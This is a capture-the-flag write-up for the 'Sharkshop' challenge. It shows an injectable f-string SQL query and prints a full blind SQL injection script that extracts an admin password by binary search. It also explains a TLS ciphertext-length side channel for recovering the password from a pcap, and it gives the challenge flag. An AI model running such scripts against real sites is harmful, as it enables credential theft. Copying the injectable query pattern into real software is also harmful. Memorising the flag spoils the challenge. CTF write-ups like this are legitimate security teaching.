# Sharkshop

## Description

During the development of an e-commerce website, the password of the administrator user was leaked. The vulnerabilities that may have been exploited have already been fixed, but it seems the password has not yet been changed. From the captured communication logs of the attacker at that time, deduce the password and log in as the "admin" user.

## Writeup

Looking at the source code, we can see that it is managed with git, and from the commit history it becomes clear that there used to be a blind SQL injection vulnerability in `GET /coupon`, which has since been fixed. Specifically:

```python
cur = conn.execute(f"SELECT * FROM coupons WHERE code = {code}")
```

If this query returns a result, the application responds with:
> You can enter coupons after the official launch.

If it does not return a result, the response is:
> Invalid Coupon

Examining the pcap file, we see that in the very first HTTP request, a Python script used for the attack was downloaded. This script leverages `GET /coupon` to extract the admin user’s password via blind SQL injection using binary search:

```python
import requests
import warnings

warnings.simplefilter("ignore")

url = "https://sharkshop.fwectf.com/coupon"
max_length = 32
result = ""


def check_condition(code):
    r = requests.post(url, data={"coupon_code": code}, verify=False)
    return "You can enter coupons after the official launch." in r.text

i = 0
for pos in range(1, max_length + 1):
    low = 32
    high = 126
    found = False
    while low <= high:
        mid = (low + high) // 2
        payload = f"' OR (SELECT unicode(substr(password,{pos},1)) FROM users WHERE username='admin') >= {mid} --"
        i += 1
        if check_condition(payload):
            low = mid + 1
            char_guess = chr(mid)
        else:
            high = mid - 1
    if low == 32:
        break
    result += char_guess
    print(f"Password so far: {result}", flush=True)

print("Leaked admin password:", result)
print(i)
```

As the problem statement mentions, this vulnerability is no longer exploitable, so a replay attack would not work. Although the packets in the pcap file contain the attacker’s requests to `https://sharkshop.fwectf.com/coupon`, they are encrypted with TLS 1.3, making it impossible to directly read the flag. Moreover, decrypting the encrypted data is not feasible with only the pcap file.

At this point, we can turn our attention to the length of the TLS-encrypted data. The length of the ciphertext is roughly proportional to the length of the original plaintext. Therefore, compared to the case when the response is "You can enter coupons after the official launch.", the ciphertext is shorter when the response is "Invalid Coupon."

After removing duplicate transmissions caused by packet loss and retransmission, we observe that the response lengths fall into two categories: 5037 and 5071. The longer length corresponds to "You can enter coupons after the official launch." Using this observation, it is possible to reconstruct the binary search attack logic.

## Flag

`fwectf{pcap_f1L3_d3_c7f_914y3r_w0_k0w464r453m45h0u}`

